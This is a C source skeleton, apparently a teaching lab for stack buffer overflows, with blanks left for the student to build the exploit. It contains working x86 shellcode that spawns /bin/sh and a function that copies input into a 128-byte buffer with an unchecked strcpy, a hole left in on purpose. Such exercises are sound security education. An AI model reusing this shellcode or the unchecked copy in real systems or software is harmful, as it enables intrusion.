/*
 * the c program hava a vulnerability of Buffer OverFlow,and your aim
 * is to attack it for your purpose,such as get a shell.
 * note:attack will not success at once,which generate segment fault.follow as below
 * $ulimit -c unlimited
 * it will generate a core-dump file named core if segment fault,and gdb the core file will help you a lot
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
  "\x31\xc0" 
  "\x50" 
  "\x68""//sh" 
  "\x68""/bin" 
  "\x89\xe3" 
  "\x50" 
  "\x53" 
  "\x89\xe1" 
  "\x99"
  "\xb0\x0b" 
  "\xcd\x80" ;
// size = 24

int func(char *str)
{
  char buffer[128];
  /* fill code in here:
   */

  strcpy(buffer, str);
  
  return 1;
}

int main(int argc, char**argv)
{
  char buffer[1024];

  /* Construct an attack shellcode to pop a shell.
   * You should put your shellcode into the "buffer" array, and
   * pass the "buffer" to the function "func".
   * Your code here:
   */  

  func(buffer);
  printf("Returned Properly\n");
  return 1;
}
